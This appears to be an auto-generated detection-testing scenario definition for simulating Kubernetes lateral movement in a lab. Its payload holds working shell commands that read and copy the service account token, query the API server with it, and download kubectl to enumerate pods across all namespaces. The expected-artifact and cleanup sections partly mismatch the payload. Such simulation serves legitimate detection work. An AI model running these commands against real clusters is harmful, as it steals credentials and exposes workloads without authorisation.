identity.name: Kubernetes Lateral Movement and Persistence
identity.summary: Auto-generated draft from CortexSim scenario SIM-CDR-004. Plane: CDR. Primary technique: T1021.001. Requires human enrichment of BIOC logic + panw_mapping rule_ids.
identity.description:
Auto-generated draft from CortexSim scenario SIM-CDR-004. Plane: CDR. Primary technique: T1021.001. Requires human enrichment of BIOC logic + panw_mapping rule_ids.

Source scenario: SIM-CDR-004.
UC: Kubernetes Lateral Movement Detection / TC: kubectl Abuse and CronJob Persistence.

prerequisites.description: Lab environment matching scenario SIM-CDR-004 requirements.

payload.code:
# step-1: Enumerate Kubernetes service accounts and RBAC permissions
echo '[*] Enumerating service account context...' && \
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo '' && \
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && \
APISERVER="https://kubernetes.default.svc" && \
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt" && \
curl -sSk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(i['metadata']['name']) for i in d.get('items',[])]" 2>/dev/null && \
echo '[*] Namespace enumeration complete'
# step-2: Steal service account token from mounted secret
TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token" && \
echo '[*] Extracting service account token...' && \
cat "$TOKEN_PATH" 2>/dev/null | cut -c1-80 && echo '...[truncated]' && \
cp "$TOKEN_PATH" /tmp/stolen_sa_token 2>/dev/null && \
echo "[!] Token copied to /tmp/stolen_sa_token" && \
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ && \
echo '[*] Service account credential harvest complete'
# step-3: kubectl get pods --all-namespaces via stolen SA token
which kubectl || (curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" -o /tmp/kubectl 2>/dev/null && chmod +x /tmp/kubectl && alias kubectl=/tmp/kubectl); \
KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/kubectl) && \
TOKEN=$(cat /tmp/stolen_sa_token 2>/dev/null) && \
APISERVER="https://kubernetes.default.svc" && \
echo '[*] Enumerating all pods across namespaces...' && \
"$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
  get pods --all-namespaces 2>&1 | tee /tmp/pod_enum.txt && \
echo '[*] Cross-namespace pod enumeration complete'

expected_artifacts.description: Process execution matching curl (heuristic from scenario step step-01)
Outbound HTTP(S) request from the scenario step
Process execution matching nc (heuristic from scenario step step-02)
Process execution matching ncat (heuristic from scenario step step-02)
Process execution matching kubectl (heuristic from scenario step step-03)

cleanup.code:
kubectl --insecure-skip-tls-verify delete cronjob cortexsim-persistence-sim -n default 2>/dev/null || true
rm -f /tmp/stolen_sa_token /tmp/pod_enum.txt /tmp/cortexsim-cronjob.yaml /tmp/kubectl
echo '[CortexSim] SIM-CDR-004 cleanup complete'
